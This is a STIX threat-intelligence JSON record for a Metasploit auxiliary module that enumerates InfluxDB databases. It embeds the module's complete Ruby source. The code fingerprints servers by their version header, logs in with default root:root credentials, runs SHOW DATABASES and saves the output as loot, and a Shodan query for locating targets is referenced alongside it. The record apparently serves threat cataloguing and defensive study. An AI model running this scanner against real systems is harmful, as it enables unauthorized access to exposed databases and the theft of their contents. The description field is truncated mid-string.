{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--0dd8936e-11db-466e-a6c8-fc7714959362",
    "created": "2024-08-14T16:29:46.093657Z",
    "modified": "2024-08-14T16:29:46.093661Z",
    "name": "InfluxDB Enum Utility",
    "description": " This module enumerates databases on InfluxDB using the REST API using the default authentication of root:root.  'References'     => [",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/influxdb_enum.rb",
            "external_id": "influxdb_enum.rb"
        },
        {
            "source_name": "reference",
            "url": "https://www.shodan.io/search?query=X-Influxdb-Version"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Report\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'InfluxDB Enum Utility',\n      'Description'    => %q{\n        This module enumerates databases on InfluxDB using the REST API using the\n        default authentication of root:root.\n      },\n      'References'     =>\n        [\n          ['URL', 'https://docs.influxdata.com/influxdb/v2.1/'],\n          ['URL', 'https://www.shodan.io/search?query=X-Influxdb-Version']\n        ],\n      'Author'         =>\n        [\n          'Roberto Soares Espreto <robertoespreto[at]gmail.com>',\n          'Nixawk'\n        ],\n      'License'        => MSF_LICENSE\n    ))\n\n    register_options(\n      [\n        Opt::RPORT(8086),\n        OptString.new('TARGETURI', [true, 'Path to list all the databases', '/']),\n        OptString.new('USERNAME', [true, 'The username to login as', 'root']),\n        OptString.new('PASSWORD', [true, 'The password to login with', 'root']),\n        OptString.new('QUERY', [true, 'The influxdb query syntax', 'SHOW DATABASES'])\n      ])\n  end\n\n  def run\n    begin\n      # Check the target if is a influxdb server\n      res = send_request_cgi(\n        'uri'    => normalize_uri(target_uri.path),\n        'method' => 'GET'\n      )\n\n      return if res.nil?\n      return if res.headers['X-Influxdb-Version'].nil?\n\n      print_good(\"#{peer} - Influx Version: #{res.headers['X-Influxdb-Version']}\")\n\n      # Send http auth to the target\n      # curl http://127.0.0.1:8086/query?q=SHOW+DATABASES\n      # curl -X POST http://127.0.0.1:8086/query --data 'q=SHOW DATABASES'\n      res = send_request_cgi(\n        'uri'           => normalize_uri(target_uri.path, '/query'),\n        'method'        => 'GET',\n        'authorization' => basic_auth(datastore['USERNAME'], datastore['PASSWORD']),\n        'vars_get'      => {\n          'q'           => datastore['QUERY']\n        }\n      )\n\n      return if res.nil?\n      return if res.headers['X-Influxdb-Version'].nil?\n\n      # Check http auth status\n      case res.code\n      when 401\n        fail_with(Failure::NoAccess, \"#{peer} - Failed to authenticate. Invalid username/password.\")\n      when 200\n\n        begin\n          jsonres = JSON.parse(res.body)\n          return if jsonres.nil?\n          return if jsonres['results'].nil?\n\n          result = JSON.pretty_generate(jsonres)\n          vprint_good(\"#{peer} - Influx DB Found:\\n\\n#{result}\\n\")\n          path = store_loot(\n            'influxdb.enum',\n            'text/plain',\n            rhost,\n            result,\n            'InfluxDB Enum'\n          )\n          print_good(\"File saved in: #{path}\")\n        rescue JSON::ParserError\n          fail_with(Failure::Unknown, \"#{peer} - Unexpected response, cannot parse JSON\")\n        end\n\n      else\n        fail_with(Failure::Unknown, \"#{peer} - Unexpected response status #{res.code}\")\n      end\n    rescue ::Rex::ConnectionError\n      fail_with(Failure::Unreachable, \"#{peer} - Failed to connect to the influx db server.\")\n    end\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ]
}